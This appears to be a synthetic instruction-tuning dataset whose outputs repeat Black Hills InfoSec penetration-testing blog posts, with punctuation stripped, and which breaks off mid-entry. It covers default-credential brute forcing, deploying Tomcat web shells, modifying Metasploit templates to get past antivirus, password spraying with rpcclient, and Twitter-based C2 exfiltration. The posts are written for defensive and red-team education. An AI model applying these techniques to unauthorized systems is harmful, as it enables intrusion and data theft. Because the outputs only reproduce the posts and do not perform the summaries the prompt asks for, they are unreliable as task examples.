[
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Need For A Change - or - Burning Your Money</title>\n<taxonomies>InfoSec 201, News, breach, external breach, internal breach, it security, verizon breach report</taxonomies>\n<creation_date>Thu, 26 Mar 2015 17:43:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mick Douglas Take look at this chart from last year's Verizon Data Breach Report It shows who notified the breached party when they were attacked This graph is a sad indictment for all of us in the information protection industry This chart means that only about 1 in 8 times there's a breach it's found out by an internal party Of course this means that 7 times of those 8 it's discovered by someone external to your organization That has got to hurt If you doubt me just ask the PR firm or department of any breached organization There's two ways you can look at this chart First you can despair that all the spending on IT security has largely been what Wasted We'll not go that far Misallocated might be a better way of thinking about how your funds were spent Secondly we can't help but see that there's so much room for improvement that virtually anything we change could make a big impact In light of such a lopsided graph it's plain to see our internal detective controls need a quick boost While many are tempted to take the traditional approach to situations such as this namely spending on new tools until the problem appears to go away We at BHIS would suggest a different course of action Start making things harder for the bad guys by taking a more active defensive posture We'll be listing some ways to make your defenses be more resilient durable cost effective and above all active over the next few postings here so stay tuned Before we finish this post one thing to note the internal IT Audit Department lead the pack for finding the breaches That's great Good job auditors Seriously when was the last time you thanked your auditor Let's make this into a friendly competition and have the IT Operations and Security Teams lead the findings next year We're certainly looking forward to the Verizon Data Breach Report for this coming year Who knows what it'll contain Although given how rough The Year of the Breach was the only sure bet is that it will have eye popping charts"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Waiting Is the Hardest Part: A Purple Team's Take on MS15-034</title>\n<taxonomies>InfoSec 301, Blue Team, Danger Will Robinson, MS15-034, Patch, Purple Team, Red Team, Remote Code Execution</taxonomies>\n<creation_date>Thu, 16 Apr 2015 17:47:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mick Douglas Current Status MS15-034 has remote Denial of Service DoS Remote exploit code appears to be ready soon maybe Stay tuned BLUE TEAM MARCHING ORDERS Patch Now Please Pay very careful attention to your IIS logs for systems that are attacking or attempting the DoS You are being profiled Vulnerable servers will be the targets of attacks once working exploit code is released RED TEAM MARCHING ORDERS Keep your eyes and ears open Help explain the risks to folks in your org who don't get the gravity of this Details Despite a poor reputation for security for the last few years Microsoft has been doing an amazing job on the security front It's been about seven years since we had a remote code execution exploit publicly available for Windows and it looks like MS15-034 will likely be the end of that streak This is an attack against IIS and other web services that make use of HTTP.sys This vulnerability is exploited by attackers who send specially crafted HTTP requests At the time of this writing most of the attack tools released for this vulnerability 'simply create a denial of service by crashing the listening web service or the server's OS Since availability is part of the CIA Confidentiality Integrity and Availability triad this is a big deal But it's likely about to get much worse There are newer variants of this attack that appear to be moving beyond the realm of simple DoS and are instead injecting executable code directly into memory Hint this isn't good What's worse is that this code will be run with System privileges There are no accounts that have a higher level of access on a Windows system Having random folks from the internet running code of their choice on your server is probably not a good thing We at BHIS encourage you to NOT take the approach Blanche duBois from A Streetcar Named Desire did I've always depended on the kindness of strangers What makes this such a serious issue is that attacking web services is an attack against the raison d'etre for these systems This means your external firewall must allow access to the very service that's vulnerable D'oh Because this vulnerability is such a tempting target everyone who's got an iota of exploit development skill is working feverishly on this Not only is there lasting fame and fortune for the winner of this race there's a SUBSTANTIAL amount money at stake If there's one thing we've learned from the movies it's love conquers all Wait not that Greed is good So show me the money"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Asterisk SIP Server, From \"Info\" to \"Ouch\"</title>\n<taxonomies>External/Internal, Password Spray, Red Team, Info2Ouch, Nessus, Vulnerabilities</taxonomies>\n<creation_date>Mon, 01 Jun 2015 17:54:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts I learned some new stuff that will make me pay attention to Asterisk Detection Nessus informational findings in the future On an external network scan Nessus reported two hosts running Asterisk SIP services as an informational finding When entering the IP address in a browser only a blank page was returned however I ran dirbuster on it and found a login page at http mobile Looking at the server response for this page showed that extensions and usernames are revealed in javascript The IPitomy user manual indicated that a login page exists at http ippbx on these systems This login page is shown in the image below The manual indicated that the default admin credentials are pbxadmin ipitomy and that the non-admin user username is always their extension with a default password equal to the extension as well For example the extension 123 would have a username of 123 and a default password of 123 The default admin credentials did not work in this case but some of the default user credentials did I used Burp Suite's Intruder functionality to guess the same username and password for extensions 100-999 To set this attempt up in Burp Intruder I used Battering ram attack type to place the same payload in all defined positions as shown below On the payloads tab I set a payload type of Numbers and set the number range from 100 to 999 counting by ones Some of the accounts were using the default password The successful login credentials could be spotted in the intruder results window by comparing the length of the response In this case a length of 361 versus 231 was the indicator Comparing response length is often a good way to quickly determine success of an intruder attack but using the grep extract option is a life saver when response length isn't a good enough indicator You can define the portion of the response you want to extract from the Intruder options menu as shown below I set the grep extract expression to show any text after ocation and before Vary in order to pick out the location header in the redirect response This makes the successful response really stand out as shown below With a successful login a person can configure call settings like call forwarding view call logs and listen to voicemail Lastly I checked for account lockout by guessing 100 bad passwords in less than one minute immediately followed by a successful login with the correct password This means it is likely that other passwords could be discovered through brute-forcing since the user names are known and there is no account lockout mechanism All in all this Informational finding for Asterisk Detection as reported by Nessus led to the discovery of three vulnerabilities in this case 1 Information disclosure of employee first and last names and associated phone extensions on the login page 2 Non-administrative access to user accounts through default credentials giving access to call settings and voicemail 3 No account lockout to prevent password guessing for known extensions"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Service Detection - Tomcat Manager, From \"Info\" to \"Ouch\"</title>\n<taxonomies>Red Team, Web App, Info2Ouch, Nessus, Vulnerabilities</taxonomies>\n<creation_date>Wed, 15 Jul 2015 17:59:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Continuing on the thread of highlighting Nessus vulnerability scan results that turned out to be more severe than reported I always review the Info level Service Detection finding reported by Nessus particularly any web servers that it lists because there are often blatant security issues hidden in there This is as simple as visiting each host port combination in a web browser and seeing what the server response is To aid me in this effort when there are a lot of results to go through I use a free tool called EyeWitness by Chris Truncer that reads all the protocol host and port combinations from the Nessus scan and takes a screenshot of each one as if you visited it manually in a web browser This allows me to quickly scan through the images and pick out services of interest or concern Other similar and recommended tools for doing the same thing are PeepingTom by Tim Tomes and Rawr by al14s During a recent penetration test I didn't have any of these tools available so I just used a web browser and entered the URL manually The scan result had indicated that a web server was running on port 8080 of several hosts On one of the hosts this brought up an Apache Tomcat page with a link to Tomcat Manager A username and password was required to gain access to the Manager but to my surprise a default username of admin and a blank password worked I was surprised because this is something I think Nessus should have highlighted as a vulnerability Then again I've seen Nessus miss default credential findings a lot so I shouldn't be surprised Access to the manager allowed deployment of WAR files from its interface as shown below An attacker or penetration tester can then deploy a web shell to the server to obtain command shell access to the server You can utilize a pre-built WAR file containing a web shell from the Laudanum project sponsored by Secure Ideas for this exploit So there you have it a little golden nugget in an informational finding that is actually a critical vulnerability allowing command shell access to the server"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Modifying Metasploit x64 template for AV evasion</title>\n<taxonomies>Author, External/Internal, Joff Thyer, Red Team, AV, AV evasion, modifying measpoilt, shellcode</taxonomies>\n<creation_date>Wed, 21 Oct 2015 20:21:42 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer When performing a penetration of test of organizations with Windows desktops many testers will now resort to using tools like Veil's Powershell Empire in order to inject shellcode directly into memory Without doubt this is a fantastic technique as it avoids writing to disk and running headlong into a direct hit by most endpoint protection solutions xkcd The malware aquarium It is often the the case that we want to perform some more thorough testing by using actual malware executables and perhaps different command and control techniques during our test We want to vary our techniques in order to find out where the clipping threshold of defense technologies is set and be able to comprehensively report back on what techniques were effective on a system versus what techniques were not In most environments the most commonly deployed endpoint protection technology is an Antivirus engine Antivirus has become very effective at detecting off-the-shelf 32-bit malware executables from the Metasploit framework but tends to be lacking in the 64-bit arena Additionally we find that network resident defenses are well-tuned to 32-bit second stage payloads from Metasploit but less capable of seeing a 64-bit second stage payload In my experience the AV engines are not exclusively looking at the shellcode but also matching on the assembly code that constitutes the stub loader for Metasploit executables generated by the msfvenom command When Metasploit payloads are generated they use a standard template executable in both the 32-bit and 64-bit cases The standard templates are in the form of precompiled executables in the framework's data directory In addition to the templates the Metasploit project provides a source code directory in the framework Focusing specifically on Windows we can find both the 32-bit template source in C and the 64-bit template source in assembly both of which are in the usr share metasploit-framework data templates src pe exe directory on a KALI distribution In both the 32 and 64-bit cases the template source has a very similar function It allocates a buffer of 4096 bytes in memory and puts the string PAYLOAD at the beginning of this buffer The string PAYLOAD is placed into the buffer as a constant that indicates a starting place for msfvenom to use when creating a new payload executable That starting place is an address in memory which msfvenom knows can be used to copy shellcode into The size of the available buffer for shellcode is the allocated buffer size in the template EXE minus eight the length of the string PAYLOAD Msfvenom will take the chosen payload encode it with the appropriate encoder if specified and prepend no-operation NOP sled bytes if also chosen The final executable in the 32-bit case has been compiled from C source code In the C source code the shellcode is called by casting the payload buffer to a pointer to a function which has no function parameters The final executable in the 64-bit case has been compiled from assembly code The assembly code function allocates an executable buffer of memory copies the shellcode into that memory and executes it using a CALL instruction This is a very similar technique used by many different tools including the awesome Powershell toys we all use 32-bit source code for EXE template 64-bit assembly source code for EXE template Armed with this knowledge I decided to see how one single AV engine Avast reacted when I simply took the 64-bit executable template and copied it to a Windows system Note that I did not even put any shellcode payload into the EXE but only took the template itself It was not really surprising that Avast immediately triggered an alert Let's face it matching on the assembly opcodes for the template is a pretty easy way of triggering an alert without having to actually examine the shellcode payload Avast tells me this is bad Staying focused on the 64-bit case there is absolutely no reason why I cannot recompile this assembly code and modify it as much or as little as I want to We only need to make sure that at some point it calls the two required bits of code to copy the payload into an executable memory segment we allocated and then executes it Case 1 For my first level of fun I simply recompiled the same source assembly code Not surprisingly Avast flagged this Case 2 I changed the buffer length to 8192 bytes and recompiled Nothing other than the buffer length was changed Avast completely failed this test by not flagging a single alert How do I know Well I compiled it on the system that Avast was also running Note that the instructions for compiling the assembly code are helpfully listed in the commands of the source code Last section of x64 assembly listing Case 3 I modified all of the values in the assembly code to 8192 then took my newly generated executable template and created two different payloads with it One of the payloads used the 64-bit XOR encoding on the shellcode while the other used no encoding at all I then copied the payload files to my Windows 7 machine running Avast I forced Avast to scan them and they passed with flying colors Then I executed them and shell was mine With case 3 I was particularly amused at Avast's DEEP SCAN which seemed to indicate that it was looking really hard at what was going on But then it told me that all was fine and the malware was happily executed New assembly source code listing with 8192 buffer length 64-bit payload using new template and no encoding 64-bit payload using new template and XOR encoding New payloads in a directory on the Windows system Go ahead and scan my directory I am safe what a relief Oh no I might get caught here Phew And now it's shell time Conclusion My theory and practical experience was that AV vendors are looking at the templates rather than the shellcode itself In this specific instance we saw immediate success with only a minor assembly code modification and absolutely no encoding of a 64-bit shellcode payload Why choose Avast No specific reason other than I needed a solution in a hurry to execute my test I will be repeating the experiment with other AV engines to see what my mileage looks like There are many possible variations on this technique but like so much in life it is better to start simple and ramp up as needed Happy hunting"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Password Spraying & Other Fun with RPCCLIENT</title>\n<taxonomies>Author, Joff Thyer, Password Spray, Red Team, Joff Thyer, password spraying, RPCCLINET</taxonomies>\n<creation_date>Fri, 30 Oct 2015 20:25:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Many of us in the penetration testing community are used to scenarios whereby we land a targeted phishing campaign within a Windows enterprise environment and have that wonderful access into the world of Windows command line networking tools You get your shell and before you know it you are ready to run all your favorite enumeration commands These are things like C NET VIEW DOMAIN C NET GROUP Domain Administrators DOMAIN ...and so on Not to mention that you often have all of the wealth of Metasploit post exploitation modules and the many wonders of various PowerShell tools such as Veil and PowerShell Empire Imagine a world where all you have is a Linux host available on an internal network with no backdoor shell access to any existing Windows system Imagine that world wherein you are effectively segmented away from the rest of the network and cannot even capture useful network traffic using interception techniques such as Ettercap This was indeed the case for me recently whereby all I could do was SSH into a single Linux host I controlled After having not been in this situation in some time I paused a moment before recalling the wonderful world of Samba In particular there are two excellent and useful programs in the Samba suite namely rpcclient and its friend smbclient Also let us not forget our favorite DNS utility called dig My first task was to use available reconnaissance to make informed guesses as to what the internal domain name was likely to be There are a few different methods to think about here but the first thing was to play with dig to determine DNS information of use I can try to look up the Windows global catalog record and authoritative domain server records to determine domain controller addresses Examples as follows This will only give me answers if I have predicted or determined the correct domain.corp name Now luckily for me I had access to internal Nessus vulnerability report data and had determined that SMB NULL sessions were permitted to some hosts I matched up the data to my dig results and determined that the NULL sessions were actually corresponding to domain controller addresses My next task was to try and enumerate user and group information from the domain controllers with rpcclient only available to me I quickly determined by using the man page that rpcclient could indeed perform an anonymous bind as follows ...whereby 10.10.10.10 was the chosen address of the domain controller I could anonymously bind to After that command was run rpcclient will give you the most excellent rpcclient prompt At this point in time if you can use anonymous sessions then there are some very useful commands within the tool 1 Enumerate Domain Users 2 Enumerate Domain Groups 3 Query Group Information and Group Membership 4 Query Specific User Information including computers by RID So in working with these basic commands I was able to survey the landscape of Windows domain user and group information pretty thoroughly Another technique often used during a penetration test is called password spraying This is a particularly effective technique whereby given a list of domain users and knowledge of very common password use the tester attempts to perform a login for every user in the list The technique is very effective given that you deliberately limit the list of passwords to try to a small number In fact a single password per spraying attempt is advisable for the sole reason that you really do not want to lock accounts Before password spraying it is very useful to determine the Windows domain password policy using a command such as NET ACCOUNTS DOMAIN in the Windows world However given that we don't have a Windows shell available to us rpcclient gives us the following options At least we are able to determine the crucial information about the password length After I write this I will probably work out how to decode the password properties and match them back to the appropriate information but I have not yet done that task In order to perform a password spray attack the next step is to pick a common password such as Autumn2015 and work out our technique on how to spray using rpcclient Conveniently rpcclient allows us to specify some commands on the command line which is very handy The follow two examples show a successful logon versus a failed logon Password of bbb is the correct logon In these examples we specifically told rpcclient to run two commands these being getusername and then quit to exit out of the client Now we have all of the ingredients to perform a password spraying attack All we need is a bourne bash shell loop and we are off to the races Example of a simple shell script or command line to spray given that the enumdomusers output is in the domain-users.txt file would be as follows You know that you are successful when you see the string Authority appear in the output Lack of success for each user is going to be the NT_STATUS_LOGON_FAILURE message If you begin to get the ACCOUNT_LOCKED failure you should immediately stop your spray because you have likely sprayed too many times in a short period of time Assuming you have gained access to a credential one of the additional nice things you can do is explore the SYSVOL using the smbclient program The syntax is as follows I highly recommend getting familiar with the UNIX Samba suite and in particular these tools They quite literally saved my bacon over the past week and you could well be in the same boat needing these fun tools in your future also"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How Compliance Compromises Happen. (Or, The Most Boring Article Title in the History of All the  Internet)</title>\n<taxonomies>Author, InfoSec 201, John Strand</taxonomies>\n<creation_date>Mon, 02 Nov 2015 21:29:49 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand There have been quite a few articles lately on how compliance standard X or Y is broken Unfortunately this often leads to blaming the nameless and faceless people behind the standards It is easy to simply say they are dullards and not fit to be setting any agenda relating to computer security Dullards do what Dullards do While this may be true there is a bit more to it than that Further if we look at how these standards get watered down there is a lot we can learn Basically let's talk about common mistakes when it comes to creating and adhering to compliance frameworks As a side note most of this is based on helping a relatively small group try to define security standards within their limited geographical location for a specific industry The only reason I am writing this is that many of the problems they ran into are the same issues I see again and again in our customers ww.darkreading.com analytics hipaa-not-helping-healthcares-software-security-lagging d d-id 1322715 Burdens on Industry The first major breakdown when creating or adhering to compliance is the intense fear that the standards are going to be too burdensome on the industry in question A long time ago I was working on compliance standards for various oil companies in relation to the government It was my first experience with this issue There was much hemming and hawing about overburdening the oil and gas industry with unnecessary oversight that would make the whole process unprofitable This was years before the whole scandal in MMS blew up in 2010 See the article by Ian Urbina for more details But the really odd thing to me at the time was the fact that the very people who were complaining about overburdening an industry were the same people who drove prestige class rental vehicles to the meetings and wore clothes that were worth more than I made in a month at the time What exactly is the point of all this The point is the people who create compliance requirements are often under tremendous political pressure by people far more powerful than they are Further even if rampant corruption and graft are not at play as human beings we have a huge desire to make as many people as possible happy This often standardizes mediocrity We have seen this again and again in this industry from the seven-layer module to PCI to HIPAA Also when this occurs it often obscures the true meaning of what the compliance standards were trying to do in the first place For example many compliance standards are meant to be a series of guidelines and are provided to offer direction for organizations who don't even know where to start These things quickly become the core baseline and minimum level of effort organizations strive to meet Anything above and beyond these recommendations is often looked at as a waste of money Fear of the Unknown There is a certain herd mentality that infects all we do in security This is because many people have little-to-no understanding of what they are doing from a base-technical level For example when testing and working with customers it is very common for us to encounter auditors who downplay technical risks because it does not fit into some simple compliance model they work with A number of years ago we were testing an energy company and discovered a large number of edge-routers with telnet running with no authentication for user access and a default password would grant enable or level 15 access to the devices Needless to say this vulnerability would allow us to completely take over their networks However when we provided this customer with this vulnerability they immediately discounted it because when running a vulnerability scanner it simply found the telnet server and blessed this vulnerability with a low CVSS score The customer was hesitant to fix the issue because some other authority deemed the risk lower than what we provided There was much handwringing over going against the automated risk score So we demonstrated how the vulnerability could be exploited and once they saw the true risk they immediately addressed the issue But they had to see the risk first To put their hand in its side if you will This also brings up another point Many of the best testers I have ever known were auditors who got sick and tired of being asked to prove it That is what penetration testing provides Proof Not scan results Not automated risk scores It is about removing the shroud of the unknown and bringing clarity Pentest challenge accepted It is All Unknown At the end of the day many of the standards which exist today don't make sense But why How does this happen In fact pretty easily For example there are a wide number of compliance standards in organizations that require passwords of eight characters or more Why For us to answer that question we need to go back in time We are in 2015 after all and we have self-lacing shoes and flying cars To take this one password length example and truly understand it we have to go back to 1985 Yes the Back to the Future references are thick in this one Anyway the NIST Greenbook was released you can get it here src.nist.gov publications secpubs rainbow std002.txt It references several things First it mentions how long we should use passwords for roughly 6 months before changing them And it also covers the length of the passwords for those timeframes A nice in the middle number was eight characters This was all based on how long it would take to crack a password over a 300 baud services which is 8.5 guesses per min Yeah 300 baud See this is how a lot of compliance errors occur People do not understand something and they instead rely on the previous work of others who came before Insanity carries forward Because no one knows better Things We Don't Understand Seem Hard In sports there are often these mystical barriers we believe are insurmountable Things like breaking the sub four-minute mile which was done by Bannister in 1954 It seemed impossible but once it is done many follow Or a more applicable example internal firewalls or Internet whitelisting These two security approaches seem impossible as well However if we look at implementing them in even permissive ways we are far more secure than a simple AV Blacklisting approach We have worked with many companies who have no desire to move to a whitelisting firewall everything approach However once they were compromised their attitude changed rather quickly Once they start down the path of greater restriction it did not seem so hard Eventually it Gets Better As much as this seems like one long painful breakdown of the compliance breakdown it does get better We are starting to see organizations that are far more interested in doing things right than being compliant Believe me I have seen it No Really Stop laughing I have seen organizations who have started to empower their security teams to do the right thing They have proper budgets They have security teams who are focusing on their data and not a checklist They are companies who have management support at the highest levels They are ever so much closer to being secure because they know that secure is a process not a destination But It Does Get Worse First That was nice wasn't it Looks like we might end this post on a happy note No we will not See in almost every organization who gets better and moves away from trying to be compliant and instead moves to being secure they were compromised They learned their lessons They touched the frying pan and found it was hot They will do anything in their power to not make the same mistakes again I have seen some companies who have imported these lessons in the form of hiring a C-O from a company who was burnt But somewhere in their past there was a deep dark psychological altering experience that made them learn that simply being compliant will not work We have to strive for better No one dies and is at peace with the fact they made their networks compliant No one"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The New Security Fundamentals - Kill Your AV</title>\n<taxonomies>Author, How-To, InfoSec 201, John Strand, AV, firewalls, Kill your AV, say no to networks, turn off networks</taxonomies>\n<creation_date>Tue, 03 Nov 2015 21:35:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand AV is Dead Long Live Whitelisting We have been discovering more and more of our tests bypass AV controls with ease We have yet to see any iteration or vendor in the blacklist space who is adequately preventing attacks using simple blacklist solutions What needs to be done in this industry is a move towards a whitelisting approach This can either be in the form of a product like Bit9 Lumension or Bromium Or it can be in the form of using existing controls such as Applocker and or Software Restriction Policies SRP We recommend organizations start with Applocker then work their way up to full Application Whitelisting Basically you can start by defining exactly what directories are allowed to run various programs For example we can lock down programs to run from the Windows and Program Files directories There are ways to bypass this i.e ISR-Evilgrade style attacks exploit the app and launch from that directory however the overall improvement to the security of an environment is extensive To put it bluntly if I had to choose Applocker or traditional AV I would choose Applocker every time Further this is not something that is product-specific It is something you probably already have in your environment This is key as it does not require purchasing another very expensive tool to achieve Firewall Everything Another key trait we see in many successful organizations is the heavy use of internal firewalls While we have gotten pretty good at setting up firewalls on the parameter of our environments we are still horrible at enabling the things on the inside of our parameters Now let me be crystal clear on this The built-in firewall on Windows is horrible Its login is hideous and it can be a pain to enable across your environment via group policy Turn it on anyway There is also the option of using the firewalls built into various AV products The nice thing about these firewalls is that they are already deployed and can be managed from a centralized location From a policy perspective these should be set up on the workstations that can only be accessed from tightly controlled Admin VPNs and server subnets but the workstations cannot talk to each other At all There is no good reason to have workstations talking to each other over SMB Users should not be sharing files in this way Ever Basically you want to treat your internal network as hostile because it is What does this do For starters it will stop an attacker from pivoting using pass-the-hash attacks or token impersonation to other workstations I cannot stress this enough When we are testing we pivot from machine to machine till we find one with a local privilege escalation vulnerability or has sensitive data we can access But turning on your local firewall you can effectively stop this from happening Attackers can still access file servers and critical services But those communication paths are known and can be monitored far easier than trying to monitor every communication between every system Internet Whitelisting This is by far the most contentious item in this write-up Any time I talk about Internet whitelisting in a class or at a conference I get a lot of screaming crying hiding under tables and breakout sessions of alcoholism Standard Preparation for an Active Defense Talk Yeah my presentations can get out of hand quickly But before all the pitchforks and Molotov cocktails get thrown in my general direction I want everyone to take a deep cleansing breath See when I discuss Internet whitelisting people have this odd vision of Internet star chambers convening to debate in painful detail the pros and cons of every website their users request to access Blood will be spilled Joints pulled from sockets That is not what I am talking about Rather let's play a simple mental game Let's say hypothetically that you whitelist the top 1 000 sites on the internet Of course you would exclude porn gambling and One Direction sites But you would allow all others Then if a user wanted to access a site not on the list you would do a quick review then allow it No blood no inquisition Heck you could even allow users to automatically add sites Would your total exposure to the Internet be more or less than it is now The answer is it would be dramatically reduced Not even a small fraction of what it was before Yes the sites you allow could possibly be used to attack your users But if your users were compromised the resulting C2 would most likely not go through Remember the goal is not reducing risk to 0 but rather trying to get it to an acceptable level Also this will further reduce the white noise that often needs to be cut through in almost any incident or Hunt Teaming engagement Discrepancy Analysis At any security team's core the goal should be simply to identify deviations from the norm However as an inverse to this it also requires us to have a firm understanding of what exactly normal is This is both harder and easier than many people believe For example trying to take an inventory of every system can be a total nightmare However there are tools out there that can be of assistance First the Security Onion has Bro installed and it has a very cool ability to do a full inventory of all the user-agent strings that pass through it This can be used to quickly identify user-agent strings which are abnormal Why does this matter First it can be very helpful to identify old systems that are still lurking in your environment If all your systems are Windows 7-10 and you see a Windows XP user-agent string then it could be a UA string for a piece of malware or it could be a very out-of-date system that needs to be eradicated like a termite or roach Some other tools that are outstanding for discrepancy analysis are Kansa and Microsoft Advanced Threat analytics Both of these can be used to baseline large numbers of systems and run comparisons of the configurations applications and network connections Kansa or the user behavior on the network Microsoft Advanced Threat Analytics Conclusions Years ago I made a joke I said environments would be far more secure if they would simply remove anti-virus I made a few people mad My point is this if we did disable AV we would be more secure Looking back I should have been far firmer with my analysis YOU WOULD BE MORE SECURE Why Because then you would do all of these other things to secure your network AV IDS IPS are all security theater They provide an illusion of security that was never there We need to get beyond them We need to understand that attackers will bypass them because they will and then start building our networks accordingly"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Can we C2? Yes we can!</title>\n<taxonomies>C2, Red Team</taxonomies>\n<creation_date>Fri, 18 Dec 2015 21:44:15 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson It's become more and more common lately to see advanced attackers using legitimate internet channels to move data in and out of networks Social networks such as Twitter and Tumblr utilities such as Dropbox and Soundcloud and even business tools such as Salesforce and Google Docs can all be used as channels for command and control Threat intelligence reports such as this one from FireEye can provide insight into the tactics techniques and procedures of these opponents but they don't provide the hands-on experience that network defenders need to prepare against these types of real-world threats That's where new offensive tools come in Like everyone here at BHIS I love security In my case this translates to a lot of late nights hammering out software such as sneaky-creeper an open-source project designed to enable easy communication over legitimate internet channels for the purpose of threat emulation It's designed to be readable and easy to use from sneakers import Exfil channels actually move data channel twitter encoders let you encrypt encode mess with the data before you send it encoders b64 note that they can be chained contains the API keys and details for the account you'll post to twitter_params key xxxx secret xxxx token xxxx tsecret xxxx name twitter_account_name data whatever you'd like feed Exfil channel encoders feed.set_channel_params sending twitter_params receiving twitter_params feed.send data print feed.receive Sneaky-creeper is built and maintained by a team of students and is still a work in progress while it's a little rough around the edges it's constantly being refined and improved to provide a robust communications channel to emulate advanced attacker communications capabilities If you're interested in unusual C C methods check it out on Github _______ See more from Dakota at his blog Ungineers.com"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Developing Hacking Kung Fu (or How To Get Into Information Security)</title>\n<taxonomies>Author, Derek Banks, General InfoSec Tips & Tricks, InfoSec 101</taxonomies>\n<creation_date>Mon, 21 Dec 2015 21:45:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
